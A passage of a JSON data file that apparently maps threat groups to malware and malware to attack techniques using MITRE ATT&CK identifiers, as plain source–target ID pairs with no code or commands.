            "target": "T1083"
        },
        {
            "source": "S0559",
            "target": "T1082"
        },
        {
            "source": "S0559",
            "target": "T1070"
        },
        {
            "source": "S0559",
            "target": "T1057"
        },
        {
            "source": "S0559",
            "target": "T1047"
        },
        {
            "source": "S0559",
            "target": "T1033"
        },
        {
            "source": "S0559",
            "target": "T1027"
        },
        {
            "source": "S0559",
            "target": "T1016"
        },
        {
            "source": "S0559",
            "target": "T1012"
        },
        {
            "source": "S0559",
            "target": "T1007"
        },
        {
            "source": "S0559",
            "target": "T1005"
        },
        {
            "source": "G0016",
            "target": "S0559"
        },
        {
            "source": "G0016",
            "target": "S0552"
        },
        {
            "source": "S0516",
            "target": "T1071.001"
        },
        {
            "source": "S0516",
            "target": "T1069.002"
        },
        {
            "source": "S0516",
            "target": "T1087.002"
        },
        {
            "source": "S0516",
            "target": "T1087.001"
        },
        {
            "source": "S0516",
            "target": "T1053.005"
        },
        {
            "source": "S0516",
            "target": "T1190"
        },
        {
            "source": "S0516",
            "target": "T1140"
        },
        {
            "source": "S0516",
            "target": "T1105"
        },
        {
            "source": "S0516",
            "target": "T1083"
        },
        {
            "source": "S0516",
            "target": "T1082"
        },
        {
            "source": "S0516",
            "target": "T1057"
        },
        {
            "source": "S0516",
            "target": "T1027"
        },
        {
            "source": "S0516",
            "target": "T1016"
        },
        {
            "source": "G0016",
            "target": "S0516"
        },
        {
            "source": "S0515",
            "target": "T1573.002"
        },
        {
            "source": "S0515",
            "target": "T1571"
        },
        {
            "source": "S0515",
            "target": "T1560"
        },
        {
            "source": "S0515",
            "target": "T1140"
        },
        {
            "source": "S0515",
            "target": "T1105"
        },
        {
            "source": "S0515",
            "target": "T1095"
        },
        {
            "source": "S0515",
            "target": "T1033"
        },
        {
            "source": "S0515",
            "target": "T1016"
        },
        {
            "source": "S0515",
            "target": "T1005"
        },
        {
            "source": "G0016",
            "target": "S0515"
        },
        {
            "source": "S0514",
            "target": "T1573.002"
        },
        {
            "source": "S0514",
            "target": "T1573.001"
        },
        {
            "source": "S0514",
            "target": "T1071.004"
        },
        {
            "source": "S0514",
            "target": "T1071.001"
        },
        {
            "source": "S0514",
            "target": "T1001.001"
        },
        {
            "source": "S0514",
            "target": "T1132.001"
        },
        {
            "source": "S0514",
            "target": "T1059.003"
        },
        {
            "source": "S0514",
            "target": "T1059.001"
        },
        {
            "source": "S0514",
            "target": "T1069.002"
        },
        {
            "source": "S0514",
            "target": "T1140"
        },
        {
            "source": "S0514",
            "target": "T1105"
        },
        {
            "source": "S0514",
            "target": "T1082"
        },
        {
            "source": "S0514",
            "target": "T1033"
        },
        {
            "source": "S0514",
            "target": "T1016"
        },
        {
            "source": "S0514",
            "target": "T1005"
        },
        {
            "source": "G0016",
            "target": "S0514"
        },
        {
            "source": "S0511",
            "target": "T1102.002"
        },
        {
            "source": "S0511",
            "target": "T1059.001"
        },
        {
            "source": "S0511",
            "target": "T1027.003"
        },
        {
            "source": "S0511",
            "target": "T1546.003"
        },
        {
            "source": "S0511",
            "target": "T1140"
        },
        {
            "source": "S0511",
            "target": "T1112"
        },
        {
            "source": "S0511",
            "target": "T1105"
        },
        {
            "source": "S0511",
            "target": "T1027"
        },
        {
            "source": "G0016",
            "target": "S0511"
        },
        {
            "source": "S0518",
            "target": "T1071.001"
        },
        {
            "source": "S0518",
            "target": "T1102.001"
        },
        {
            "source": "S0518",
            "target": "T1027.003"
        },
        {
            "source": "S0518",
            "target": "T1218.011"
        },
        {
            "source": "S0518",
            "target": "T1140"
        },
        {
            "source": "S0518",
            "target": "T1112"
        },
        {
            "source": "S0518",
            "target": "T1106"
        },
        {
            "source": "S0518",
            "target": "T1105"
        },
        {
            "source": "S0518",
            "target": "T1027"
        },
        {
            "source": "G0016",
            "target": "S0518"
        },
        {
            "source": "G0016",
            "target": "S0195"
        },
        {
            "source": "S0183",
            "target": "T1573.002"
        },
        {
            "source": "S0183",
            "target": "T1090.003"
        },
        {
            "source": "G0016",
            "target": "S0183"
        },
        {
            "source": "S0175",
            "target": "T1090.004"
        },
        {
            "source": "G0016",
            "target": "S0175"
        },
        {
            "source": "G0016",
            "target": "S0154"
        },
        {
            "source": "S0150",
            "target": "T1573.002"
        },
        {
            "source": "S0150",
            "target": "T1568.002"
        },
        {
            "source": "S0150",
            "target": "T1059.001"
        },
        {
            "source": "S0150",
            "target": "T1070.006"
        },
        {
            "source": "S0150",
            "target": "T1546.003"
        },
        {
            "source": "S0150",
            "target": "T1105"
        },
        {
            "source": "S0150",
            "target": "T1030"
        },
        {
            "source": "S0150",
            "target": "T1027"
        },
        {
            "source": "G0016",
            "target": "S0150"
        },
        {
            "source": "S0139",
            "target": "T1564.004"
        },
        {
            "source": "S0139",
            "target": "T1059.003"
        },
        {
            "source": "S0139",
            "target": "T1027.003"
        },
        {
            "source": "S0139",
            "target": "T1070.004"
        },
        {
            "source": "S0139",
            "target": "T1547.001"
        },
        {
            "source": "S0139",
            "target": "T1218.011"
        },
        {
            "source": "S0139",
            "target": "T1485"
        },
        {
            "source": "S0139",
            "target": "T1124"
        },
        {
            "source": "S0139",
            "target": "T1105"
        },
        {
            "source": "S0139",
            "target": "T1083"
        },
        {
            "source": "S0139",
            "target": "T1082"
        },
        {
            "source": "S0139",
            "target": "T1057"
        },
        {
            "source": "S0139",
            "target": "T1043"
        },
        {
            "source": "S0139",
            "target": "T1033"
        },
        {
            "source": "S0139",
            "target": "T1016"
        },
        {
            "source": "S0139",
            "target": "T1010"
        },
        {
            "source": "G0016",
            "target": "S0139"
        },
        {
            "source": "G0016",
            "target": "S0100"
        },
        {
            "source": "G0016",
            "target": "S0096"
        },
        {
            "source": "G0016",
            "target": "S0057"
        },
        {
            "source": "S0054",
            "target": "T1071.001"
        },
        {
            "source": "S0054",
            "target": "T1102.002"
        },
        {
            "source": "S0054",
            "target": "T1105"
        },
        {
            "source": "G0016",
            "target": "S0054"
        },
        {
            "source": "S0053",
            "target": "T1573.001"
        },
        {
            "source": "S0053",
            "target": "T1071.001"
        },
        {
            "source": "S0053",
            "target": "T1132.001"
        },
        {
            "source": "S0053",
            "target": "T1059.003"
        },
        {
            "source": "S0053",
            "target": "T1059.001"
        },
        {
            "source": "S0053",
            "target": "T1560.002"
        },
        {
            "source": "S0053",
            "target": "T1114.002"
        },
        {
            "source": "S0053",
            "target": "T1027.002"
        },
        {
            "source": "S0053",
            "target": "T1070.004"
        },
        {
            "source": "S0053",
            "target": "T1550.003"
        },
        {
            "source": "S0053",
            "target": "T1547.009"
        },
        {
            "source": "S0053",
            "target": "T1546.003"
        },
        {
            "source": "S0053",
            "target": "T1547.001"
        },
        {
            "source": "S0053",
            "target": "T1105"
        },
        {
            "source": "S0053",
            "target": "T1078"
        },
        {
            "source": "G0016",
            "target": "S0053"
        },
        {
            "source": "S0052",
            "target": "T1071.001"
        },
        {
            "source": "S0052",
            "target": "T1102.003"
        },
        {
            "source": "S0052",
            "target": "T1499"
        },
        {
            "source": "S0052",
            "target": "T1140"
        },
        {
            "source": "S0052",
            "target": "T1003"
        },
        {
            "source": "G0016",
            "target": "S0052"
        },
        {
            "source": "S0051",
            "target": "T1071.001"
        },
        {
            "source": "S0051",
            "target": "T1090.001"
        },
        {
            "source": "S0051",
            "target": "T1102.001"
        },
        {
            "source": "S0051",
            "target": "T1568.002"
        },
        {
            "source": "S0051",
            "target": "T1543"
        },
        {
            "source": "S0051",
            "target": "T1105"
        },
        {
            "source": "S0051",
            "target": "T1083"
        },
        {
            "source": "S0051",
            "target": "T1082"
        },
        {
            "source": "S0051",
            "target": "T1027"
        },
        {
            "source": "S0051",
            "target": "T1008"
        },
        {
            "source": "G0016",
            "target": "S0051"
        },
        {
            "source": "S0050",
            "target": "T1573.001"
        },
        {
            "source": "S0050",
            "target": "T1071.001"
        },
        {
            "source": "S0050",
            "target": "T1048.003"
        },
        {
            "source": "S0050",
            "target": "T1003.004"
        },
        {
            "source": "S0050",
            "target": "T1114.001"
        },
        {
            "source": "S0050",
            "target": "T1555.003"
        },
        {
            "source": "S0050",
            "target": "T1056.001"
        },
        {
            "source": "S0050",
            "target": "T1555"
        },
        {
            "source": "S0050",
            "target": "T1003.002"
        },
        {
            "source": "S0050",
            "target": "T1543.003"
        },
        {
            "source": "S0050",
            "target": "T1053.005"
        },
        {
            "source": "S0050",
            "target": "T1115"
        },
        {
            "source": "S0050",
            "target": "T1113"
        },
        {
            "source": "S0050",
            "target": "T1083"
        },
        {
            "source": "S0050",
            "target": "T1068"
        },
        {
            "source": "S0050",
            "target": "T1039"
        },
        {
            "source": "S0050",
            "target": "T1025"
        },
        {
            "source": "S0050",
            "target": "T1020"
        },
        {
            "source": "S0050",
            "target": "T1005"
        },
        {
            "source": "G0016",
            "target": "S0050"
        },
        {
            "source": "S0049",
            "target": "T1071.001"
        },
        {
            "source": "S0049",
            "target": "T1087.001"
        },
        {
            "source": "S0049",
            "target": "T1083"
        },
        {
            "source": "S0049",
            "target": "T1057"
        },
        {
            "source": "S0049",
            "target": "T1016"
        },
        {
            "source": "S0049",
            "target": "T1007"
        },
        {
            "source": "G0016",
            "target": "S0049"
        },
        {
            "source": "S0048",
            "target": "T1071.001"
        },
        {
            "source": "S0048",
            "target": "T1555.003"
        },
        {
            "source": "S0048",
            "target": "T1555"
        },
        {
            "source": "S0048",
            "target": "T1083"
        },
        {
            "source": "S0048",
            "target": "T1082"
        },
        {
            "source": "S0048",
            "target": "T1005"
        },
        {
            "source": "S0048",
            "target": "T1003"
        },
        {
            "source": "G0016",
            "target": "S0048"
        },
        {
            "source": "S0046",
            "target": "T1071.001"
        },
        {
            "source": "S0046",
            "target": "T1102.002"
        },
        {
            "source": "S0046",
            "target": "T1059.003"
        },
        {
            "source": "S0046",
            "target": "T1518.001"
        },
        {
            "source": "S0046",
            "target": "T1003.002"
        },
        {
            "source": "S0046",
            "target": "T1003.001"
        },
        {
            "source": "S0046",
            "target": "T1036.003"
        },
        {
            "source": "S0046",
            "target": "T1547.001"
        },
        {
            "source": "S0046",
            "target": "T1218.011"
        },
        {
            "source": "S0046",
            "target": "T1543.003"
        },
        {
            "source": "S0046",
            "target": "T1053.005"
        },
        {
            "source": "S0046",
            "target": "T1497"
        },
        {
            "source": "S0046",
            "target": "T1082"
        },
        {
            "source": "S0046",
            "target": "T1027"
        },
        {
            "source": "G0016",
            "target": "S0046"
        },
        {
            "source": "G0016",
            "target": "S0039"
        },
        {
            "source": "S0037",
            "target": "T1573.001"
        },
        {
            "source": "S0037",
            "target": "T1071.001"
        },
        {
            "source": "S0037",
            "target": "T1001.002"
        },
        {
            "source": "S0037",
            "target": "T1102.003"
        },
        {
            "source": "S0037",
            "target": "T1564.003"
        },
        {
            "source": "S0037",
            "target": "T1567.002"
        },
        {
            "source": "S0037",
            "target": "T1059.001"
        },
        {
            "source": "G0016",
            "target": "S0037"
        },
        {
            "source": "G0016",
            "target": "S0029"
        },
        {
            "source": "G0016",
            "target": "S0002"
        },
        {
            "source": "S0350",
            "target": "T1059.003"
        },
        {
            "source": "S0350",
            "target": "T1021.002"
        },
        {
            "source": "S0350",
            "target": "T1021.001"
        },
        {
            "source": "S0350",
            "target": "T1070.004"
        },
        {
            "source": "S0350",
            "target": "T1543.003"
        },
        {
            "source": "S0350",
            "target": "T1053.005"
        },
        {
            "source": "S0350",
            "target": "T1112"
        },
        {
            "source": "S0350",
            "target": "T1083"
        },
        {
            "source": "S0350",
            "target": "T1082"
        },
        {
            "source": "S0350",
            "target": "T1033"
        },
        {
            "source": "S0350",
            "target": "T1016"
        },
        {
            "source": "G0014",
            "target": "S0350"
        },
        {
            "source": "G0014",
            "target": "S0110"
        },
        {
            "source": "G0014",
            "target": "S0073"
        },
        {
            "source": "G0014",
            "target": "S0029"
        },
        {
            "source": "G0014",
            "target": "S0008"
        },
        {
            "source": "S0036",
            "target": "T1074.001"
        },
        {
            "source": "S0036",
            "target": "T1560.003"
        },
        {
            "source": "S0036",
            "target": "T1547.001"
        },
        {
            "source": "S0036",
            "target": "T1083"
        },
        {
            "source": "S0036",
            "target": "T1025"
        },
        {
            "source": "S0036",
            "target": "T1005"
        },
        {
            "source": "G0013",
            "target": "S0036"
        },
        {
            "source": "S0035",
            "target": "T1074.001"
        },
        {
            "source": "S0035",
            "target": "T1052.001"
        },
        {
            "source": "S0035",
            "target": "T1560.003"
        },
        {
            "source": "S0035",
            "target": "T1547.009"
        },
        {
            "source": "S0035",
            "target": "T1547.001"
        },
        {
            "source": "S0035",
            "target": "T1083"
        },
        {
            "source": "G0013",
            "target": "S0035"
        },
        {
            "source": "S0034",
            "target": "T1573.001"
        },
        {
            "source": "S0034",
            "target": "T1071.001"
        },
        {
            "source": "S0034",
            "target": "T1568"
        },
        {
            "source": "S0034",
            "target": "T1059.003"
        },
        {
            "source": "S0034",
            "target": "T1547.001"
        },
        {
            "source": "S0034",
            "target": "T1095"
        },
        {
            "source": "S0034",
            "target": "T1094"
        },
        {
            "source": "S0034",
            "target": "T1083"
        },
        {
            "source": "S0034",
            "target": "T1071"
        },
        {
            "source": "S0034",
            "target": "T1057"
        },
        {
            "source": "S0034",
            "target": "T1041"
        },
        {
            "source": "S0034",
            "target": "T1008"
        },
        {
            "source": "G0013",
            "target": "S0034"
        },
        {
            "source": "S0031",
            "target": "T1071.001"
        },
        {
            "source": "S0031",
            "target": "T1132.002"
        },
        {
            "source": "S0031",
            "target": "T1090.001"
        },
        {
            "source": "S0031",
            "target": "T1059.003"
        },
        {
            "source": "S0031",
            "target": "T1562.004"
        },
        {
            "source": "S0031",
            "target": "T1547.009"
        },
        {
            "source": "S0031",
            "target": "T1547.001"
        },
        {
            "source": "S0031",
            "target": "T1112"
        },
        {
            "source": "S0031",
            "target": "T1104"
        },
        {
            "source": "S0031",
            "target": "T1083"
        },
        {
            "source": "S0031",
            "target": "T1082"
        },
        {
            "source": "S0031",
            "target": "T1057"
        },
        {
            "source": "S0031",
            "target": "T1041"
        },
        {
            "source": "S0031",
            "target": "T1012"
        },
        {
            "source": "G0013",
            "target": "S0031"
        },
        {
            "source": "S0028",
            "target": "T1547.009"
        },
        {
            "source": "S0028",
            "target": "T1547.001"
        },
        {
            "source": "S0028",
            "target": "T1091"
        },
        {
            "source": "G0013",
            "target": "S0028"
        },
        {
            "source": "G0011",
            "target": "S0032"
        },
        {
            "source": "G0011",
            "target": "S0012"
        },
        {
            "source": "S0010",
            "target": "T1573.001"
        },
        {
            "source": "S0010",
            "target": "T1560"
        },
        {
            "source": "G0011",
            "target": "S0010"
        },
        {
            "source": "G0011",
            "target": "S0008"
        },
        {
            "source": "G0011",
            "target": "S0002"
        },
        {
            "source": "G0010",
            "target": "S0590"
        },
        {
            "source": "S0587",
            "target": "T1027.005"
        },
        {
            "source": "S0587",
            "target": "T1573.002"
        },
        {
            "source": "S0587",
            "target": "T1059.004"
        },
        {
            "source": "S0587",
            "target": "T1036.005"
        },
        {
            "source": "S0587",
            "target": "T1222.002"
        },
        {
            "source": "S0587",
            "target": "T1070.004"
        },
        {
            "source": "S0587",
            "target": "T1053.003"
        },
        {
            "source": "S0587",
            "target": "T1205"
        },
        {
            "source": "S0587",
            "target": "T1105"
        },
        {
            "source": "S0587",
            "target": "T1095"
        },
        {
            "source": "S0587",
            "target": "T1083"
        },
        {
            "source": "S0587",
            "target": "T1082"
        },
        {
            "source": "S0587",
            "target": "T1041"
        },
        {
            "source": "S0587",
            "target": "T1040"
        },
        {
            "source": "S0587",
            "target": "T1027"
        },
        {
            "source": "S0587",
            "target": "T1016"
        },
        {
            "source": "G0010",
            "target": "S0587"
        },
        {
            "source": "S0581",
            "target": "T1059.006"
        },
        {
            "source": "S0581",
            "target": "T1036.004"
        },
        {
            "source": "S0581",
            "target": "T1055.001"
        },
        {
            "source": "S0581",
            "target": "T1053.005"
        },
        {
            "source": "S0581",
            "target": "T1140"
        },
        {
            "source": "S0581",
            "target": "T1057"
        },
        {
            "source": "S0581",
            "target": "T1055"
        },
        {
            "source": "S0581",
            "target": "T1027"
        },
        {
            "source": "G0010",
            "target": "S0581"
        },
        {
            "source": "S0538",
            "target": "T1071.001"
        },
        {
            "source": "S0538",
            "target": "T1102.002"
        },
        {
            "source": "S0538",
            "target": "T1074.001"
        },
        {
            "source": "S0538",
            "target": "T1574.001"
        },
        {
            "source": "S0538",
            "target": "T1567.002"
        },
        {
            "source": "S0538",
            "target": "T1560.001"
        },
        {
            "source": "S0538",
            "target": "T1036.004"
        },
        {
            "source": "S0538",
            "target": "T1053.005"
        },
        {
            "source": "S0538",
            "target": "T1120"
        },
        {
            "source": "S0538",
            "target": "T1119"
        },
        {
            "source": "S0538",
            "target": "T1041"
        },
        {
            "source": "S0538",
            "target": "T1025"
        },
        {
            "source": "S0538",
            "target": "T1020"
        },
        {
            "source": "S0538",
            "target": "T1008"
        },
        {
            "source": "S0538",
            "target": "T1005"
        },
        {
            "source": "G0010",
            "target": "S0538"
        },
        {
            "source": "S0537",
            "target": "T1573.001"
        },
        {
            "source": "S0537",
            "target": "T1078.001"
        },
        {
            "source": "S0537",
            "target": "T1087.001"
        },
        {
            "source": "S0537",
            "target": "T1559"
        },
        {
            "source": "S0537",
            "target": "T1112"
        },
        {
            "source": "S0537",
            "target": "T1106"
        },
        {
            "source": "G0010",
            "target": "S0537"
        },
        {
            "source": "S0395",
            "target": "T1573.001"
        },
        {
            "source": "S0395",
            "target": "T1071.003"
        },
        {
            "source": "S0395",
            "target": "T1001.002"
        },
        {
            "source": "S0395",
            "target": "T1074.001"
        },
        {
            "source": "S0395",
            "target": "T1059.003"
        },
        {
            "source": "S0395",
            "target": "T1565.002"
        },
        {
            "source": "S0395",
            "target": "T1560"
        },
        {
            "source": "S0395",
            "target": "T1114.002"
        },
        {
            "source": "S0395",
            "target": "T1036.005"
        },
        {
            "source": "S0395",
            "target": "T1070.004"
        },
        {
            "source": "S0395",
            "target": "T1505.002"
        },
        {
            "source": "S0395",
            "target": "T1140"
        },
        {
            "source": "S0395",
            "target": "T1119"
        },
        {
            "source": "S0395",
            "target": "T1106"
        },
        {
            "source": "S0395",
            "target": "T1105"
        },
        {
            "source": "S0395",
            "target": "T1082"
        },
        {
            "source": "S0395",
            "target": "T1041"
        },
        {
            "source": "S0395",
            "target": "T1029"
        },
        {
            "source": "S0395",
            "target": "T1027"
        },
        {
            "source": "S0395",
            "target": "T1020"
        },
        {
            "source": "S0395",
            "target": "T1016"
        },
        {
            "source": "S0395",
            "target": "T1005"
        },
        {
            "source": "G0010",
            "target": "S0395"
        },
        {
            "source": "S0393",
            "target": "T1102.002"
        },
        {
            "source": "S0393",
            "target": "T1059.001"
        },
        {
            "source": "S0393",
            "target": "T1070.006"
        },
        {
            "source": "S0393",
            "target": "T1057"
        },
        {
            "source": "S0393",
            "target": "T1027"
        },
        {
            "source": "G0010",
            "target": "S0393"
        },
        {
            "source": "G0010",
            "target": "S0363"
        },
        {
            "source": "S0335",
            "target": "T1573.002"
        },
        {
            "source": "S0335",
            "target": "T1071.001"
        },
        {
            "source": "S0335",
            "target": "T1048.003"
        },
        {
            "source": "S0335",
            "target": "T1074.001"
        },
        {
            "source": "S0335",
            "target": "T1543.003"
        },
        {
            "source": "S0335",
            "target": "T1055.001"
        },
        {
            "source": "S0335",
            "target": "T1053.005"
        },
        {
            "source": "S0335",
            "target": "T1140"
        },
        {
            "source": "S0335",
            "target": "T1124"
        },
        {
            "source": "S0335",
            "target": "T1102"
        },
        {
            "source": "S0335",
            "target": "T1095"
        },
        {
            "source": "S0335",
            "target": "T1069"
        },
        {
            "source": "S0335",
            "target": "T1057"
        },
        {
            "source": "S0335",
            "target": "T1049"
        },
        {
            "source": "S0335",
            "target": "T1043"
        },
        {
            "source": "S0335",
            "target": "T1027"
        },
        {
            "source": "S0335",
            "target": "T1018"
        },
        {
            "source": "S0335",
            "target": "T1016"
        },
        {
            "source": "S0335",
            "target": "T1012"
        },
        {
            "source": "G0010",
            "target": "S0335"
        },
        {
            "source": "S0256",
            "target": "T1573.001"
        },
        {
            "source": "S0256",
            "target": "T1546.015"
        },
        {
            "source": "S0256",
            "target": "T1059.003"
        },
        {
            "source": "S0256",
            "target": "T1059.001"
        },
        {
            "source": "S0256",
            "target": "T1518.001"
        },
        {
            "source": "S0256",
            "target": "T1070.004"
        },
        {
            "source": "S0256",
            "target": "T1547.001"
        },
        {
            "source": "S0256",
            "target": "T1218.011"
        },
        {
            "source": "S0256",
            "target": "T1112"
        },
        {
            "source": "S0256",
            "target": "T1106"
        },
        {
            "source": "S0256",
            "target": "T1105"
        },
        {
            "source": "S0256",
            "target": "T1057"
        },
        {
            "source": "S0256",
            "target": "T1047"
        },
        {
            "source": "S0256",
            "target": "T1033"
        },
        {
            "source": "S0256",
            "target": "T1027"
        },
        {
            "source": "S0256",
            "target": "T1016"
        },
        {
            "source": "G0010",
            "target": "S0256"
        },
        {
            "source": "S0265",
            "target": "T1071.002"
        },
        {
            "source": "S0265",
            "target": "T1071.001"
        },
        {
            "source": "S0265",
            "target": "T1132.001"
        },
        {
            "source": "S0265",
            "target": "T1090.001"
        },
        {
            "source": "S0265",
            "target": "T1102.002"
        },
        {
            "source": "S0265",
            "target": "T1074.001"
        },
        {
            "source": "S0265",
            "target": "T1069.001"
        },
        {
            "source": "S0265",
            "target": "T1059.004"
        },
        {
            "source": "S0265",
            "target": "T1059.003"
        },
        {
            "source": "S0265",
            "target": "T1087.001"
        },
        {
            "source": "S0265",
            "target": "T1070.004"
        },
        {
            "source": "S0265",
            "target": "T1547.009"
        },
        {
            "source": "S0265",
            "target": "T1547.001"
        },
        {
            "source": "S0265",
            "target": "T1543.003"
        },
        {
            "source": "S0265",
            "target": "T1055.001"
        },
        {
            "source": "S0265",
            "target": "T1485"
        },
        {
            "source": "S0265",
            "target": "T1125"
        },
        {
            "source": "S0265",
            "target": "T1113"
        },
        {
            "source": "S0265",
            "target": "T1105"
        },
        {
            "source": "S0265",
            "target": "T1083"
        },
        {
            "source": "S0265",
            "target": "T1082"
        },
        {
            "source": "S0265",
            "target": "T1057"
        },
        {
            "source": "S0265",
            "target": "T1047"
        },
        {
            "source": "S0265",
            "target": "T1033"
        },
        {
            "source": "S0265",
            "target": "T1029"
        },
        {
            "source": "S0265",
            "target": "T1027"
        },
        {
            "source": "S0265",
            "target": "T1016"
        },
        {
            "source": "S0265",
            "target": "T1010"
        },
        {
            "source": "S0265",
            "target": "T1008"
        },
        {
            "source": "S0265",
            "target": "T1005"
        },
        {
            "source": "G0010",
            "target": "S0265"
        },
        {
            "source": "S0168",
            "target": "T1573.002"
        },
        {
            "source": "S0168",
            "target": "T1573.001"
        },
        {
            "source": "S0168",
            "target": "T1071.001"
        },
        {
            "source": "S0168",
            "target": "T1564.004"
        },
        {
            "source": "S0168",
            "target": "T1553.002"
        },
        {
            "source": "S0168",
            "target": "T1070.006"
        },
        {
            "source": "S0168",
            "target": "T1070.004"
        },
        {
            "source": "S0168",
            "target": "T1547.009"
        },
        {
            "source": "S0168",
            "target": "T1547.004"
        },
        {
            "source": "S0168",
            "target": "T1546.002"
        },
        {
            "source": "S0168",
            "target": "T1547.001"
        },
        {
            "source": "S0168",
            "target": "T1055.003"
        },
        {
            "source": "S0168",
            "target": "T1053.005"
        },
        {
            "source": "S0168",
            "target": "T1105"
        },
        {
            "source": "S0168",
            "target": "T1055"
        },
        {
            "source": "S0168",
            "target": "T1033"
        },
        {
            "source": "S0168",
            "target": "T1027"
        },
        {
            "source": "G0010",
            "target": "S0168"
        },
        {
            "source": "G0010",
            "target": "S0160"
        },
        {
            "source": "S0126",
            "target": "T1564.005"
        },
        {
            "source": "S0126",
            "target": "T1573.002"
        },
        {
            "source": "S0126",
            "target": "T1546.015"
        },
        {
            "source": "S0126",
            "target": "T1071.003"
        },
        {
            "source": "S0126",
            "target": "T1071.001"
        },
        {
            "source": "S0126",
            "target": "T1102.002"
        },
        {
            "source": "S0126",
            "target": "T1059.003"
        },
        {
            "source": "S0126",
            "target": "T1059.001"
        },
        {
            "source": "S0126",
            "target": "T1036.004"
        },
        {
            "source": "S0126",
            "target": "T1055.001"
        },
        {
            "source": "S0126",
            "target": "T1053.005"
        },
        {
            "source": "S0126",
            "target": "T1518"
        },
        {
            "source": "S0126",
            "target": "T1140"
        },
        {
            "source": "S0126",
            "target": "T1124"
        },
        {
            "source": "S0126",
            "target": "T1112"
        },
        {
            "source": "S0126",
            "target": "T1106"
        },
        {
            "source": "S0126",
            "target": "T1029"
        },
        {
            "source": "S0126",
            "target": "T1027"
        },
        {
            "source": "S0126",
            "target": "T1012"
        },
        {
            "source": "G0010",
            "target": "S0126"
        },
        {
            "source": "G0010",
            "target": "S0104"
        },
        {
            "source": "S0102",
            "target": "T1049"
        },
        {
            "source": "S0102",
            "target": "T1016"
        },
        {
            "source": "G0010",
            "target": "S0102"
        },
        {
            "source": "G0010",
            "target": "S0099"
        },
        {
            "source": "G0010",
            "target": "S0096"
        },
        {
            "source": "S0091",
            "target": "T1573.001"
        },
        {
            "source": "S0091",
            "target": "T1071.001"
        },
        {
            "source": "S0091",
            "target": "T1069.001"
        },
        {
            "source": "S0091",
            "target": "T1518.001"
        },
        {
            "source": "S0091",
            "target": "T1087.001"
        },
        {
            "source": "S0091",
            "target": "T1560.002"
        },
        {
            "source": "S0091",
            "target": "T1560"
        },
        {
            "source": "S0091",
            "target": "T1553.002"
        },
        {
            "source": "S0091",
            "target": "T1070.004"
        },
        {
            "source": "S0091",
            "target": "T1055.011"
        },
        {
            "source": "S0091",
            "target": "T1124"
        },
        {
            "source": "S0091",
            "target": "T1083"
        },
        {
            "source": "S0091",
            "target": "T1082"
        },
        {
            "source": "S0091",
            "target": "T1057"
        },
        {
            "source": "S0091",
            "target": "T1049"
        },
        {
            "source": "S0091",
            "target": "T1033"
        },
        {
            "source": "S0091",
            "target": "T1027"
        },
        {
            "source": "S0091",
            "target": "T1018"
        },
        {
            "source": "S0091",
            "target": "T1016"
        },
        {
            "source": "S0091",
            "target": "T1012"
        },
        {
            "source": "S0091",
            "target": "T1007"
        },
        {
            "source": "G0010",
            "target": "S0091"
        },
        {
            "source": "G0010",
            "target": "S0075"
        },
        {
            "source": "G0010",
            "target": "S0057"
        },
        {
            "source": "G0010",
            "target": "S0039"
        },
        {
            "source": "G0010",
            "target": "S0029"
        },
        {
            "source": "S0022",
            "target": "T1027.002"
        },
        {
            "source": "S0022",
            "target": "T1014"
        },
        {
            "source": "G0010",
            "target": "S0022"
        },
        {
            "source": "G0010",
            "target": "S0002"
        },
        {
            "source": "S0142",
            "target": "T1059.003"
        },
        {
            "source": "S0142",
            "target": "T1518.001"
        },
        {
            "source": "S0142",
            "target": "T1218.011"
        },
        {
            "source": "S0142",
            "target": "T1543.003"
        },
        {
            "source": "S0142",
            "target": "T1112"
        },
        {
            "source": "S0142",
            "target": "T1083"
        },
        {
            "source": "S0142",
            "target": "T1082"
        },
        {
            "source": "S0142",
            "target": "T1057"
        },
        {
            "source": "S0142",
            "target": "T1027"
        },
        {
            "source": "G0009",
            "target": "S0142"
        },
        {
            "source": "G0009",
            "target": "S0097"
        },
        {
            "source": "S0080",
            "target": "T1059.003"
        },
        {
            "source": "S0080",
            "target": "T1003.002"
        },
        {
            "source": "S0080",
            "target": "T1547.001"
        },
        {
            "source": "S0080",
            "target": "T1105"
        },
        {
            "source": "S0080",
            "target": "T1043"
        },
        {
            "source": "G0009",
            "target": "S0080"
        },
        {
            "source": "S0074",
            "target": "T1573.001"
        },
        {
            "source": "S0074",
            "target": "T1071.001"
        },
        {
            "source": "S0074",
            "target": "T1574.002"
        },
        {
            "source": "S0074",
            "target": "T1059.003"
        },
        {
            "source": "S0074",
            "target": "T1070.004"
        },
        {
            "source": "S0074",
            "target": "T1548.002"
        },
        {
            "source": "S0074",
            "target": "T1547.001"
        },
        {
            "source": "S0074",
            "target": "T1218.011"
        },
        {
            "source": "S0074",
            "target": "T1543.003"
        },
        {
            "source": "S0074",
            "target": "T1105"
        },
        {
            "source": "S0074",
            "target": "T1027"
        },
        {
            "source": "G0009",
            "target": "S0074"
        },
        {
            "source": "G0009",
            "target": "S0057"
        },
        {
            "source": "G0009",
            "target": "S0039"
        },
        {
            "source": "G0009",
            "target": "S0021"
        },
        {
            "source": "G0008",
            "target": "S0108"
        },
        {
            "source": "G0008",
            "target": "S0030"
        },
        {
            "source": "G0008",
            "target": "S0029"
        },
        {
            "source": "G0008",
            "target": "S0002"
        },
        {
            "source": "S0502",
            "target": "T1071.001"
        },
        {
            "source": "S0502",
            "target": "T1090.001"
        },
        {
            "source": "S0502",
            "target": "T1059.004"
        },
        {
            "source": "S0502",
            "target": "T1070.004"
        },
        {
            "source": "S0502",
            "target": "T1547.006"
        },
        {
            "source": "S0502",
            "target": "T1140"
        },
        {
            "source": "S0502",
            "target": "T1105"
        },
        {
            "source": "S0502",
            "target": "T1095"
        },
        {
            "source": "S0502",
            "target": "T1041"
        },
        {
            "source": "S0502",
            "target": "T1027"
        },
        {
            "source": "S0502",
            "target": "T1014"
        },
        {
            "source": "S0502",
            "target": "T1005"
        },
        {
            "source": "G0007",
            "target": "S0502"
        },
        {
            "source": "S0410",
            "target": "T1132.001"
        },
        {
            "source": "S0410",
            "target": "T1059.004"
        },
        {
            "source": "S0410",
            "target": "T1056.001"
        },
        {
            "source": "S0410",
            "target": "T1036.005"
        },
        {
            "source": "S0410",
            "target": "T1036.004"
        },
        {
            "source": "S0410",
            "target": "T1070.004"
        },
        {
            "source": "S0410",
            "target": "T1543.002"
        },
        {
            "source": "S0410",
            "target": "T1547.013"
        },
        {
            "source": "S0410",
            "target": "T1083"
        },
        {
            "source": "S0410",
            "target": "T1082"
        },
        {
            "source": "S0410",
            "target": "T1057"
        },
        {
            "source": "S0410",
